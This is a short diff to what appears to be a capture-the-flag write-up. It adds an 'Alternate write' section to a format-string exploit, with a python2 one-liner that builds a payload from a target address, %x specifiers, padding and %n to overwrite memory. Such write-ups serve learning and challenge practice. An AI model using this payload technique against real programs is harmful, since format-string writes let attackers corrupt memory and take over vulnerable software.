@@ -57,7 +57,9 @@ b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
 
-## Aurel
+### Alternate write
+
+We can also substitute the `49u` and instead print 38 a, which will produce the same result!
 
 ```bash
 python2 -c 'print "\x8c\x98\x04\x08" + "%x "*3 + "a"*38 + "%n"' > /var/crash/write
